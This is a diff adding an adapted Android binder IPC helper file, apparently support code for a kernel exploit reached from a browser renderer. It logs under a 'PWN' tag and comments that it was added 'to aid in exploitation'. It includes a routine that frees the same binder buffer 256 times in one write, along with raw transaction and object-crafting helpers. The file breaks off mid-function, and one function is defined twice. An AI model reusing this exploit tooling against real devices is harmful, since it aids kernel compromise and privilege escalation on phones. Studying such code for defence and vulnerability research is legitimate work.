diff --git a/content/renderer/binder.c b/content/renderer/binder.c
new file mode 100644
index 000000000000..91b6fa587b36
--- /dev/null
+++ b/content/renderer/binder.c
@@ -0,0 +1,1281 @@
+/* Copyright 2008 The Android Open Source Project
+ */
+
+#include <errno.h>
+#include <fcntl.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <unistd.h>
+
+// #include "log.h"
+#include "binder.h"
+#include "uapi_binder.h"
+
+#define MAX_BIO_SIZE (1 << 30)
+
+#define TRACE 0
+
+void bio_init_from_txn(struct binder_io *io, struct binder_transaction_data *txn);
+
+#define log_info(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+#define log_err(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+#define ALOGE(...) __android_log_print(ANDROID_LOG_DEBUG, "PWN", __VA_ARGS__)
+
+
+#if TRACE
+
+void hexdump(void *_data, size_t len)
+{
+    unsigned char *data = _data;
+    size_t count;
+
+    for (count = 0; count < len; count++) {
+        if ((count & 15) == 0)
+            log_info("%04zu:", count);
+        log_info("\\x%02x", *data);
+        // log_info(" %02x %c", *data,
+                // (*data < 32) || (*data > 126) ? '.' : *data);
+        data++;
+        if ((count & 15) == 15)
+            log_info("\n");
+    }
+    if ((count & 15) != 0)
+        log_info("\n");
+}
+
+
+void binder_dump_txn(struct binder_transaction_data *txn)
+{
+    struct flat_binder_object *obj;
+    binder_size_t *offs = (binder_size_t *)(uintptr_t)txn->data.ptr.offsets;
+    size_t count = txn->offsets_size / sizeof(binder_size_t);
+
+    flog_info(stderr,"  target %016"PRIx64"  cookie %016"PRIx64"  code %08x  flags %08x\n",
+            (uint64_t)txn->target.ptr, (uint64_t)txn->cookie, txn->code, txn->flags);
+    flog_info(stderr,"  pid %8d  uid %8d  data %"PRIu64"  offs %"PRIu64"\n",
+            txn->sender_pid, txn->sender_euid, (uint64_t)txn->data_size, (uint64_t)txn->offsets_size);
+    hexdump((void *)(uintptr_t)txn->data.ptr.buffer, txn->data_size);
+    while (count--) {
+        obj = (struct flat_binder_object *) (((char*)(uintptr_t)txn->data.ptr.buffer) + *offs++);
+        flog_info(stderr,"  - type %08x  flags %08x  ptr %016"PRIx64"  cookie %016"PRIx64"\n",
+                obj->hdr.type, obj->flags, (uint64_t)obj->binder, (uint64_t)obj->cookie);
+    }
+}
+
+#define NAME(n) case n: return #n
+const char *cmd_name(uint32_t cmd)
+{
+    switch(cmd) {
+        NAME(BR_NOOP);
+        NAME(BR_TRANSACTION_COMPLETE);
+        NAME(BR_INCREFS);
+        NAME(BR_ACQUIRE);
+        NAME(BR_RELEASE);
+        NAME(BR_DECREFS);
+        NAME(BR_TRANSACTION);
+        NAME(BR_REPLY);
+        NAME(BR_FAILED_REPLY);
+        NAME(BR_DEAD_REPLY);
+        NAME(BR_DEAD_BINDER);
+    default: return "???";
+    }
+}
+#else
+#define hexdump(a,b) do{} while (0)
+#define binder_dump_txn(txn)  do{} while (0)
+#endif
+
+#define NAME(n) case n: return #n
+const char *cmd_name(uint32_t cmd)
+{
+    switch(cmd) {
+        NAME(BR_NOOP);
+        NAME(BR_TRANSACTION_COMPLETE);
+        NAME(BR_INCREFS);
+        NAME(BR_ACQUIRE);
+        NAME(BR_RELEASE);
+        NAME(BR_DECREFS);
+        NAME(BR_TRANSACTION);
+        NAME(BR_REPLY);
+        NAME(BR_FAILED_REPLY);
+        NAME(BR_DEAD_REPLY);
+        NAME(BR_DEAD_BINDER);
+    default: return "???";
+    }
+}
+
+
+#define BIO_F_SHARED    0x01  /* needs to be buffer freed */
+#define BIO_F_OVERFLOW  0x02  /* ran out of space */
+#define BIO_F_IOERROR   0x04
+#define BIO_F_MALLOCED  0x08  /* needs to be free()'d */
+
+struct binder_state *binder_open(const char* driver, size_t mapsize)
+{
+    struct binder_state *bs;
+    struct binder_version vers;
+
+    bs = (struct binder_state *)malloc(sizeof(*bs));
+    if (!bs) {
+        errno = ENOMEM;
+        return NULL;
+    }
+
+    bs->fd = open(driver, O_RDWR | O_CLOEXEC);
+    if (bs->fd < 0) {
+        log_info("binder: cannot open %s (%s)\n",
+                driver, strerror(errno));
+        goto fail_open;
+    }
+
+    if ((ioctl(bs->fd, BINDER_VERSION, &vers) == -1) ||
+        (vers.protocol_version != BINDER_CURRENT_PROTOCOL_VERSION)) {
+        log_info(
+                "binder: kernel driver version (%d) differs from user space version (%d)\n",
+                vers.protocol_version, BINDER_CURRENT_PROTOCOL_VERSION);
+        goto fail_open;
+    }
+
+    bs->mapsize = mapsize;
+    bs->mapped = mmap(NULL, mapsize, PROT_READ, MAP_PRIVATE, bs->fd, 0);
+    if (bs->mapped == MAP_FAILED) {
+        log_info("binder: cannot map device (%s)\n",
+                strerror(errno));
+        goto fail_map;
+    }
+
+    return bs;
+
+fail_map:
+    close(bs->fd);
+fail_open:
+    free(bs);
+    return NULL;
+}
+
+void binder_close(struct binder_state *bs)
+{
+    munmap(bs->mapped, bs->mapsize);
+    close(bs->fd);
+    free(bs);
+}
+
+int binder_become_context_manager(struct binder_state *bs)
+{
+    return ioctl(bs->fd, BINDER_SET_CONTEXT_MGR, 0);
+}
+
+int binder_write(struct binder_state *bs, void *data, size_t len)
+{
+    struct binder_write_read bwr;
+    int res;
+
+    bwr.write_size = len;
+    bwr.write_consumed = 0;
+    bwr.write_buffer = (uintptr_t) data;
+    bwr.read_size = 0;
+    bwr.read_consumed = 0;
+    bwr.read_buffer = 0;
+    res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
+    if (res < 0) {
+        log_info("binder_write: ioctl failed (%s)\n",
+                strerror(errno));
+    }
+    return res;
+}
+
+/*
+ * This is just sending 0x100 commands to free the buffer in a row,
+ * saving us a few syscalls.
+ */
+void binder_free_buffers(struct binder_state *bs, binder_uintptr_t buffer_to_free)
+{
+    struct free_buf_data {
+        uint32_t cmd_free;
+        binder_uintptr_t buffer;
+    } __attribute__((packed)) ;
+
+    struct free_buf_data data[0x100];
+    int i;
+
+    for(i=0; i < 0x100; i++){
+        data[i].cmd_free = BC_FREE_BUFFER;
+        data[i].buffer = buffer_to_free;
+    }
+
+    binder_write(bs, &data[0], sizeof(data));
+//    binder_write(bs, &data[0], sizeof(struct free_buf_data) * 0x10);
+
+}
+
+
+void binder_free_buffer(struct binder_state *bs,
+                        binder_uintptr_t buffer_to_free)
+{
+    struct {
+        uint32_t cmd_free;
+        binder_uintptr_t buffer;
+    } __attribute__((packed)) data;
+    data.cmd_free = BC_FREE_BUFFER;
+    data.buffer = buffer_to_free;
+    binder_write(bs, &data, sizeof(data));
+}
+
+void binder_send_reply(struct binder_state *bs,
+                       struct binder_io *reply,
+                       binder_uintptr_t buffer_to_free,
+                       int status)
+{
+    struct {
+        uint32_t cmd_free;
+        binder_uintptr_t buffer;
+        uint32_t cmd_reply;
+        struct binder_transaction_data txn;
+    } __attribute__((packed)) data;
+
+    data.cmd_free = BC_FREE_BUFFER;
+    data.buffer = buffer_to_free;
+    data.cmd_reply = BC_REPLY;
+    data.txn.target.ptr = 0;
+    data.txn.cookie = 0;
+    data.txn.code = 0;
+    if (status) {
+        data.txn.flags = TF_STATUS_CODE;
+        data.txn.data_size = sizeof(int);
+        data.txn.offsets_size = 0;
+        data.txn.data.ptr.buffer = (uintptr_t)&status;
+        data.txn.data.ptr.offsets = 0;
+    } else {
+        data.txn.flags = 0;
+        data.txn.data_size = reply->data - reply->data0;
+        data.txn.offsets_size = ((char*) reply->offs) - ((char*) reply->offs0);
+        data.txn.data.ptr.buffer = (uintptr_t)reply->data0;
+        data.txn.data.ptr.offsets = (uintptr_t)reply->offs0;
+    }
+    binder_write(bs, &data, sizeof(data));
+}
+
+int binder_parse(struct binder_state *bs, struct binder_io *bio,
+                 uintptr_t ptr, size_t size, binder_handler func)
+{
+    int r = 1;
+    uintptr_t end = ptr + (uintptr_t) size;
+
+    while (ptr < end) {
+        uint32_t cmd = *(uint32_t *) ptr;
+        ptr += sizeof(uint32_t);
+#if TRACE
+        log_info("%s:\n", cmd_name(cmd));
+#endif
+        switch(cmd) {
+        case BR_NOOP:
+            break;
+        case BR_TRANSACTION_COMPLETE:
+            break;
+        case BR_INCREFS:
+        case BR_ACQUIRE:
+        case BR_RELEASE:
+        case BR_DECREFS:
+#if TRACE
+            log_info("  %p, %p\n", (void *)ptr, (void *)(ptr + sizeof(void *)));
+#endif
+            ptr += sizeof(struct binder_ptr_cookie);
+            break;
+        case BR_TRANSACTION: {
+            struct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;
+            if ((end - ptr) < sizeof(*txn)) {
+                ALOGE("parse: txn too small!\n");
+                return -1;
+            }
+            binder_dump_txn(txn);
+            if (func) {
+                unsigned rdata[256/4];
+                struct binder_io msg;
+                struct binder_io reply;
+                int res;
+
+                bio_init(&reply, rdata, sizeof(rdata), 4);
+                bio_init_from_txn(&msg, txn);
+                res = func(bs, txn, &msg, &reply);
+                if (txn->flags & TF_ONE_WAY) {
+                    binder_free_buffer(bs, txn->data.ptr.buffer);
+                } else {
+                    binder_send_reply(bs, &reply, txn->data.ptr.buffer, res);
+                }
+            }
+            ptr += sizeof(*txn);
+            break;
+        }
+        case BR_REPLY: {
+            struct binder_transaction_data *txn = (struct binder_transaction_data *) ptr;
+            if ((end - ptr) < sizeof(*txn)) {
+                ALOGE("parse: reply too small!\n");
+                return -1;
+            }
+            binder_dump_txn(txn);
+            if (bio) {
+                bio_init_from_txn(bio, txn);
+                bio = 0;
+            } else {
+                /* todo FREE BUFFER */
+            }
+            ptr += sizeof(*txn);
+            r = 0;
+            break;
+        }
+        case BR_DEAD_BINDER: {
+            struct binder_death *death = (struct binder_death *)(uintptr_t) *(binder_uintptr_t *)ptr;
+            ptr += sizeof(binder_uintptr_t);
+            death->func(bs, death->ptr);
+            break;
+        }
+        case BR_FAILED_REPLY:
+            r = -1;
+            break;
+        case BR_DEAD_REPLY:
+            r = -1;
+            break;
+        default:
+            ALOGE("parse: OOPS %d\n", cmd);
+            return -1;
+        }
+    }
+
+    return r;
+}
+
+void binder_acquire(struct binder_state *bs, uint32_t target)
+{
+    uint32_t cmd[2];
+    cmd[0] = BC_ACQUIRE;
+    cmd[1] = target;
+    binder_write(bs, cmd, sizeof(cmd));
+}
+
+void binder_release(struct binder_state *bs, uint32_t target)
+{
+    uint32_t cmd[2];
+    cmd[0] = BC_RELEASE;
+    cmd[1] = target;
+    binder_write(bs, cmd, sizeof(cmd));
+}
+
+void binder_link_to_death(struct binder_state *bs, uint32_t target, struct binder_death *death)
+{
+    struct {
+        uint32_t cmd;
+        struct binder_handle_cookie payload;
+    } __attribute__((packed)) data;
+
+    data.cmd = BC_REQUEST_DEATH_NOTIFICATION;
+    data.payload.handle = target;
+    data.payload.cookie = (uintptr_t) death;
+    binder_write(bs, &data, sizeof(data));
+}
+
+int binder_call(struct binder_state *bs,
+                struct binder_io *msg, struct binder_io *reply,
+                uint32_t target, uint32_t code) {
+
+    return binder_call2(bs, msg, reply, target, code, NULL);
+
+}
+
+int binder_call2(struct binder_state *bs,
+                struct binder_io *msg, struct binder_io *reply,
+                uint32_t target, uint32_t code, char *buffer)
+{
+    int res;
+    struct binder_write_read bwr;
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data txn;
+    } __attribute__((packed)) writebuf;
+    unsigned readbuf[32];
+
+    if (msg->flags & BIO_F_OVERFLOW) {
+        log_info("binder: txn buffer overflow\n");
+        goto fail;
+    }
+
+    writebuf.cmd = BC_TRANSACTION;
+    writebuf.txn.target.handle = target;
+    writebuf.txn.code = code;
+    writebuf.txn.flags = 0;
+    writebuf.txn.data_size = msg->data - msg->data0;
+    writebuf.txn.offsets_size = ((char*) msg->offs) - ((char*) msg->offs0);
+    writebuf.txn.data.ptr.buffer = (uintptr_t)msg->data0;
+    writebuf.txn.data.ptr.offsets = (uintptr_t)msg->offs0;
+
+    bwr.write_size = sizeof(writebuf);
+    bwr.write_consumed = 0;
+    bwr.write_buffer = (uintptr_t) &writebuf;
+    bwr.read_size = 0;
+    bwr.read_consumed = 0;
+    bwr.read_buffer = 0;
+
+    // log_err("---------------- writebuf -------------\n");
+    // hexdump(&writebuf, sizeof(writebuf));
+    // log_err("----------------   Data   -------------\n");
+    // hexdump(msg->data0, msg->data - msg->data0);
+    // log_err("---------------- Offsets  -------------\n");
+    // hexdump(msg->offs0, writebuf.txn.offsets_size);
+    // log_err("IOCTL CODE: %x\n", BINDER_WRITE_READ);
+    // log_err("DATA PTR: %p\n", msg->data0);
+    // log_err("OFFS PTR: %p\n", msg->offs0);
+
+    // log_err("---------------- bwr ------------------\n");
+    // hexdump(&bwr, sizeof(bwr));
+
+    for (;;) {
+        uintptr_t thereadbuf = (buffer) ? (uintptr_t)buffer : (uintptr_t)readbuf;
+        bwr.read_size = sizeof(readbuf);
+        bwr.read_consumed = 0;
+        bwr.read_buffer = thereadbuf;
+
+        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
+
+        if (res < 0) {
+            log_info("binder: ioctl failed (%s)\n", strerror(errno));
+            goto fail;
+        }
+
+        res = binder_parse(bs, reply, (uintptr_t) thereadbuf, bwr.read_consumed, 0);
+        if (res == 0) return 0;
+        if (res < 0) goto fail;
+    }
+
+fail:
+    memset(reply, 0, sizeof(*reply));
+    reply->flags |= BIO_F_IOERROR;
+    return -1;
+}
+
+int binder_call3(struct binder_state *bs,
+                struct binder_io *msg, struct binder_io *reply,
+                uint32_t target, uint32_t code, char *buffer)
+{
+    int res;
+    struct binder_write_read bwr;
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data txn;
+    } __attribute__((packed)) writebuf;
+    unsigned readbuf[32];
+
+    if (msg->flags & BIO_F_OVERFLOW) {
+        log_info("binder: txn buffer overflow\n");
+        goto fail;
+    }
+
+    writebuf.cmd = BC_TRANSACTION;
+    writebuf.txn.target.handle = target;
+    writebuf.txn.code = code;
+    writebuf.txn.flags = 0;
+    writebuf.txn.data_size = msg->data - msg->data0;
+    writebuf.txn.offsets_size = ((char*) msg->offs) - ((char*) msg->offs0);
+    writebuf.txn.data.ptr.buffer = (uintptr_t)msg->data0;
+    writebuf.txn.data.ptr.offsets = (uintptr_t)msg->offs0;
+
+    bwr.write_size = sizeof(writebuf);
+    bwr.write_consumed = 0;
+    bwr.write_buffer = (uintptr_t) &writebuf;
+    bwr.read_size = 0;
+    bwr.read_consumed = 0;
+    bwr.read_buffer = 0;
+
+    // log_err("---------------- writebuf -------------\n");
+    // hexdump(&writebuf, sizeof(writebuf));
+    // log_err("----------------   Data   -------------\n");
+    // hexdump(msg->data0, msg->data - msg->data0);
+    // log_err("---------------- Offsets  -------------\n");
+    // hexdump(msg->offs0, writebuf.txn.offsets_size);
+    // log_err("IOCTL CODE: %x\n", BINDER_WRITE_READ);
+    // log_err("DATA PTR: %p\n", msg->data0);
+    // log_err("OFFS PTR: %p\n", msg->offs0);
+
+    // log_err("---------------- bwr ------------------\n");
+    // hexdump(&bwr, sizeof(bwr));
+
+    for (;;) {
+        uintptr_t thereadbuf = (buffer) ? (uintptr_t)buffer : (uintptr_t)readbuf;
+        bwr.read_size = sizeof(readbuf);
+        bwr.read_consumed = 0;
+        bwr.read_buffer = thereadbuf;
+
+        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
+
+        if (res < 0) {
+            log_info("binder: ioctl failed (%s)\n", strerror(errno));
+            goto fail;
+        }
+
+        res = binder_parse(bs, reply, (uintptr_t) thereadbuf, bwr.read_consumed, 0);
+        if (res == 0) return 0;
+        if (res < 0) goto fail;
+    }
+
+fail:
+    memset(reply, 0, sizeof(*reply));
+    reply->flags |= BIO_F_IOERROR;
+    return -1;
+}
+
+
+void binder_loop(struct binder_state *bs, binder_handler func)
+{
+    int res;
+    struct binder_write_read bwr;
+    uint32_t readbuf[32];
+
+    bwr.write_size = 0;
+    bwr.write_consumed = 0;
+    bwr.write_buffer = 0;
+
+    readbuf[0] = BC_ENTER_LOOPER;
+    binder_write(bs, readbuf, sizeof(uint32_t));
+
+    for (;;) {
+        bwr.read_size = sizeof(readbuf);
+        bwr.read_consumed = 0;
+        bwr.read_buffer = (uintptr_t) readbuf;
+
+        res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
+
+        if (res < 0) {
+            ALOGE("binder_loop: ioctl failed (%s)\n", strerror(errno));
+            break;
+        }
+
+        res = binder_parse(bs, 0, (uintptr_t) readbuf, bwr.read_consumed, func);
+        if (res == 0) {
+            ALOGE("binder_loop: unexpected reply?!\n");
+            break;
+        }
+        if (res < 0) {
+            ALOGE("binder_loop: io error %d %s\n", res, strerror(errno));
+            break;
+        }
+    }
+}
+
+void binder_handle_transaction(struct binder_state *bs, binder_handler func)
+{
+    int res;
+    struct binder_write_read bwr;
+    uint32_t readbuf[32];
+
+    bwr.write_size = 0;
+    bwr.write_consumed = 0;
+    bwr.write_buffer = 0;
+
+    readbuf[0] = BC_ENTER_LOOPER;
+    binder_write(bs, readbuf, sizeof(uint32_t));
+
+	bwr.read_size = sizeof(readbuf);
+	bwr.read_consumed = 0;
+	bwr.read_buffer = (uintptr_t) readbuf;
+
+	res = ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
+
+	if (res < 0) {
+	    ALOGE("binder_loop: ioctl failed (%s)\n", strerror(errno));
+	    return;
+	}
+
+	res = binder_parse(bs, 0, (uintptr_t) readbuf, bwr.read_consumed, func);
+	if (res == 0) {
+	    ALOGE("binder_loop: unexpected reply?!\n");
+	    return;
+	}
+	if (res < 0) {
+	    ALOGE("binder_loop: io error %d %s\n", res, strerror(errno));
+	    return;
+	}
+}
+
+
+void bio_init_from_txn(struct binder_io *bio, struct binder_transaction_data *txn)
+{
+    bio->data = bio->data0 = (char *)(intptr_t)txn->data.ptr.buffer;
+    bio->offs = bio->offs0 = (binder_size_t *)(intptr_t)txn->data.ptr.offsets;
+    bio->data_avail = txn->data_size;
+    bio->offs_avail = txn->offsets_size / sizeof(size_t);
+    bio->flags = BIO_F_SHARED;
+
+}
+
+void bio_init(struct binder_io *bio, void *data,
+              size_t maxdata, size_t maxoffs)
+{
+    size_t n = maxoffs * sizeof(size_t);
+
+    if (n > maxdata) {
+        bio->flags = BIO_F_OVERFLOW;
+        bio->data_avail = 0;
+        bio->offs_avail = 0;
+        return;
+    }
+
+    bio->data = bio->data0 = (char *) data + n;
+    bio->offs = bio->offs0 = (binder_size_t*)data;
+    bio->data_avail = maxdata - n;
+    bio->offs_avail = maxoffs;
+    bio->flags = 0;
+}
+
+void *bio_alloc(struct binder_io *bio, size_t size)
+{
+    size = (size + 3) & (~3);
+    if (size > bio->data_avail) {
+        bio->flags |= BIO_F_OVERFLOW;
+        return NULL;
+    } else {
+        void *ptr = bio->data;
+        bio->data += size;
+        bio->data_avail -= size;
+        return ptr;
+    }
+}
+
+void binder_done(struct binder_state *bs,
+                 struct binder_io *msg,
+                 struct binder_io *reply)
+{
+    struct {
+        uint32_t cmd;
+        uintptr_t buffer;
+    } __attribute__((packed)) data;
+
+    if (reply->flags & BIO_F_SHARED) {
+        data.cmd = BC_FREE_BUFFER;
+        data.buffer = (uintptr_t) reply->data0;
+        binder_write(bs, &data, sizeof(data));
+        reply->flags = 0;
+    }
+}
+
+static struct flat_binder_object *bio_alloc_obj(struct binder_io *bio)
+{
+    struct flat_binder_object *obj;
+
+    obj = (struct flat_binder_object *)bio_alloc(bio, sizeof(*obj));
+
+    if (obj && bio->offs_avail) {
+        bio->offs_avail--;
+        *bio->offs++ = ((char*) obj) - ((char*) bio->data0);
+        return obj;
+    }
+
+    bio->flags |= BIO_F_OVERFLOW;
+    return NULL;
+}
+
+void bio_put_uint32(struct binder_io *bio, uint32_t n)
+{
+    uint32_t *ptr = (uint32_t *)bio_alloc(bio, sizeof(n));
+    if (ptr)
+        *ptr = n;
+}
+
+void bio_put_null_obj(struct binder_io *bio) {
+    struct flat_binder_object *obj;
+
+    obj = (struct flat_binder_object *)bio_alloc(bio, sizeof(*obj));
+
+    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    obj->hdr.type = BINDER_TYPE_BINDER;
+    obj->binder = (uintptr_t)0;
+    obj->cookie = 0;
+}
+
+void bio_put_obj(struct binder_io *bio, void *ptr)
+{
+    struct flat_binder_object *obj;
+
+    obj = bio_alloc_obj(bio);
+    if (!obj)
+        return;
+
+    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    obj->hdr.type = BINDER_TYPE_BINDER;
+    obj->binder = (uintptr_t)ptr;
+    obj->cookie = 0;
+}
+
+void bio_put_weak_obj(struct binder_io *bio, void *ptr)
+{
+    struct flat_binder_object *obj;
+
+    obj = bio_alloc_obj(bio);
+    if (!obj)
+        return;
+
+    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    obj->hdr.type = BINDER_TYPE_WEAK_BINDER;
+    obj->binder = (uintptr_t)ptr;
+    obj->cookie = 0;
+
+
+}
+
+
+/* Add an offset to the list. */
+void bio_add_offset(struct binder_io *bio, uint64_t offset)
+{
+	if (!bio->offs_avail)
+		return;
+	bio->offs_avail--;
+	*bio->offs++ = offset;
+}
+
+/* Create a BINDER_TYPE_PTR object, which will contain arbitrary data. This can for example
+ * be used to contains an array of file descriptors as used by the BINDER_TYPE_FDA, which
+ * references the array within the BINDER_TYPE_PTR object.
+ * The function returns a pointer to the allocated data, so that it can be set. If the "off"
+ * pointer is submitted to the function, it will set it as well.
+ */
+void *bio_put_ptr(struct binder_io *bio, void *buffer, uint32_t size, uint32_t *off)
+{
+	struct binder_buffer_object *obj;
+//	uint32_t _off = (bio->data - bio->data0);
+
+
+	/* Allocate the object size + the size of the data we want it to contain. */
+	obj = (struct binder_buffer_object *)bio_alloc(bio, sizeof(*obj) + size);
+	if (!obj)
+		return NULL;
+
+	if (obj && bio->offs_avail) {
+		bio->offs_avail--;
+		*bio->offs++ = ((char*) obj) - ((char*) bio->data0);
+	}
+
+	/* Compute the offset index. */
+	obj->hdr.type = BINDER_TYPE_PTR;
+	obj->flags |= BIO_F_OVERFLOW;
+	obj->buffer = (binder_uintptr_t)NULL;  /* The buffer address will need a fixup, this is dealt with the bio_fixup_ptr. */
+	obj->length = size;
+	obj->parent = 0;
+	obj->parent_offset = 0;
+
+	/* Copy the data to the binder buffer. */
+	memcpy((obj + 1), buffer, size);
+
+	if (off)
+		*off = ((uint64_t)bio->offs - (uint64_t)bio->offs0) / sizeof(uint64_t) - 1;
+
+	return NULL;
+}
+
+/* Fixup a ptr address of a BINDER_TYPE_PTR object given it's offset. */
+void bio_fixup_ptr(struct binder_io *bio, void *base, uint32_t ptr_off)
+{
+	struct binder_buffer_object *obj;
+
+	//TODO: Check the offset.
+	
+	/* Check it's actually a BINDER_TYPE_PTR */
+	obj = (struct binder_buffer_object *)(bio->data0 + bio->offs0[ptr_off]);
+	if (obj->hdr.type != BINDER_TYPE_PTR) {
+		log_err("bio_fixup_ptr() -> Not a binder buffer object.\n");
+		exit(1);
+		return;
+	}
+
+	uint64_t buffer_off = bio->offs0[ptr_off] + sizeof(*obj);
+
+	obj->buffer = (binder_uintptr_t)base + buffer_off;
+	log_info("obj->buffer: %llx\n", obj->buffer);
+}
+
+/*
+ * Create a BINDER_TYPE_FDA object, and give in parameters the parent offset in
+ * the transaction, as well as the number of file descriptors, and the offset within
+ * the parent BINDER_TYPE_PTR object.
+ */
+void bio_put_fd_array(struct binder_io *bio, uint64_t parent, uint64_t parent_offset, int num_fds)
+{
+	// int i;
+	struct binder_fd_array_object *fd_obj;
+
+	/* Allocate the object containing the array. */
+	fd_obj = (struct binder_fd_array_object *)bio_alloc(bio, sizeof(*fd_obj));
+	if (!fd_obj)
+		return;
+
+	if (fd_obj && bio->offs_avail) {
+		bio->offs_avail--;
+		*bio->offs++ = ((char*) fd_obj) - ((char*) bio->data0);
+	}
+
+	fd_obj->hdr.type = BINDER_TYPE_FDA;
+	fd_obj->num_fds = num_fds;
+	fd_obj->parent = parent;
+	fd_obj->parent_offset = parent_offset;
+}
+
+void bio_put_fd(struct binder_io *bio, int fd)
+{
+    struct binder_fd_object *obj;
+
+    obj = (struct binder_fd_object *)bio_alloc_obj(bio);
+    if (!obj)
+        return;
+
+    obj->hdr.type = BINDER_TYPE_FD;
+    obj->fd = fd;
+    obj->cookie = 0;
+}
+
+void bio_put_ref(struct binder_io *bio, uint32_t handle)
+{
+    struct flat_binder_object *obj;
+
+    if (handle)
+        obj = (struct flat_binder_object *)bio_alloc_obj(bio);
+    else
+        obj = (struct flat_binder_object *)bio_alloc(bio, sizeof(*obj));
+
+    if (!obj)
+        return;
+
+    obj->flags = 0x7f | FLAT_BINDER_FLAG_ACCEPTS_FDS;
+    obj->hdr.type = BINDER_TYPE_HANDLE;
+    obj->handle = handle;
+    obj->cookie = 0;
+}
+
+
+
+
+void bio_put_string16(struct binder_io *bio, const uint16_t *str)
+{
+    size_t len;
+    uint16_t *ptr;
+
+    if (!str) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+    len = 0;
+    while (str[len]) len++;
+
+    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+    /* Note: The payload will carry 32bit size instead of size_t */
+    bio_put_uint32(bio, (uint32_t) len);
+    len = (len + 1) * sizeof(uint16_t);
+    ptr = (uint16_t *)bio_alloc(bio, len);
+    if (ptr)
+        memcpy(ptr, str, len);
+}
+
+
+void bio_put_string16_x_pad(struct binder_io *bio, const char *_str, int padding)
+{
+    unsigned char *str = (unsigned char*) _str;
+    size_t len;
+    uint16_t *ptr;
+
+    if (!str) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+    len = strlen(_str) + padding;
+
+    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+    /* Note: The payload will carry 32bit size instead of size_t */
+    bio_put_uint32(bio, len);
+    ptr = (uint16_t *)bio_alloc(bio, (len + 1) * sizeof(uint16_t));
+    if (!ptr)
+        return;
+
+    // Zero out data
+    memset(ptr, 0, len*sizeof(uint16_t));
+
+    while (*str)
+        *ptr++ = *str++;
+    *ptr++ = 0;
+}
+
+void bio_put_string16_x(struct binder_io *bio, const char *_str)
+{
+    unsigned char *str = (unsigned char*) _str;
+    size_t len;
+    uint16_t *ptr;
+
+    if (!str) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+#define EXTRA_SPACE 0
+
+    len = strlen(_str) + EXTRA_SPACE;
+
+    if (len >= (MAX_BIO_SIZE / sizeof(uint16_t))) {
+        bio_put_uint32(bio, 0xffffffff);
+        return;
+    }
+
+    /* Note: The payload will carry 32bit size instead of size_t */
+    bio_put_uint32(bio, len);
+    ptr = (uint16_t *)bio_alloc(bio, (len + 1) * sizeof(uint16_t));
+    if (!ptr)
+        return;
+
+    // Zero out data
+    memset(ptr, 0, len*sizeof(uint16_t));
+
+    while (*str)
+        *ptr++ = *str++;
+    *ptr++ = 0;
+}
+
+static void *bio_get(struct binder_io *bio, size_t size)
+{
+    size = (size + 3) & (~3);
+
+    if (bio->data_avail < size){
+        bio->data_avail = 0;
+        bio->flags |= BIO_F_OVERFLOW;
+        return NULL;
+    }  else {
+        void *ptr = bio->data;
+        bio->data += size;
+        bio->data_avail -= size;
+        return ptr;
+    }
+}
+
+uint32_t bio_get_uint32(struct binder_io *bio)
+{
+    uint32_t *ptr = (uint32_t *)bio_get(bio, sizeof(*ptr));
+    return ptr ? *ptr : 0;
+}
+
+uint16_t *bio_get_string16(struct binder_io *bio, size_t *sz)
+{
+    size_t len;
+
+    /* Note: The payload will carry 32bit size instead of size_t */
+    len = (size_t) bio_get_uint32(bio);
+    if (sz)
+        *sz = len;
+    return (uint16_t*)bio_get(bio, (len + 1) * sizeof(uint16_t));
+}
+
+static struct flat_binder_object *_bio_get_obj(struct binder_io *bio)
+{
+    size_t n;
+    size_t off = bio->data - bio->data0;
+
+    /* TODO: be smarter about this? */
+    for (n = 0; n < bio->offs_avail; n++) {
+        if (bio->offs[n] == off)
+            return (struct flat_binder_object *)bio_get(bio, sizeof(struct flat_binder_object));
+    }
+
+    bio->data_avail = 0;
+    bio->flags |= BIO_F_OVERFLOW;
+    return NULL;
+}
+
+uint32_t bio_get_ref(struct binder_io *bio)
+{
+    struct flat_binder_object *obj;
+
+    obj = _bio_get_obj(bio);
+//    log_info("[*] Ref object at %p\n", obj);
+    
+    if (!obj)
+        return 0;
+
+    if (obj->hdr.type == BINDER_TYPE_HANDLE) {
+        return obj->handle;
+    }
+
+    /* I added that for my tests, but I shouldn't be needed on Android. */
+    if (obj->hdr.type == BINDER_TYPE_BINDER) {
+	    return obj->handle;
+    }
+
+    return 0;
+}
+
+/* This is custom code added to the binder API, to aid in exploitation. */
+int binder_read(int fd, void *buffer, size_t size)
+{
+	int res;
+	struct binder_write_read bwr;
+
+	bzero(&bwr, sizeof(bwr));
+
+	bwr.read_buffer = (binder_uintptr_t)buffer;
+	bwr.read_size = size;
+
+	res = ioctl(fd, BINDER_WRITE_READ, &bwr);
+
+	if (res < 0) {
+		log_err("binder_read() -> %s\n", strerror(errno));
+		return res;
+	}
+
+
+	return bwr.read_consumed;
+}
+
+void *make_transaction(void *buffer, bool one_way, uint32_t handle, void *opaque, size_t opaque_size, void *offsets, size_t offsets_size)
+{
+	struct binder_transaction_data *tr;
+	*(uint32_t *)buffer = BC_TRANSACTION;
+	tr = (struct binder_transaction_data *)( (char *)buffer + sizeof(uint32_t));
+
+	tr->target.handle = handle;
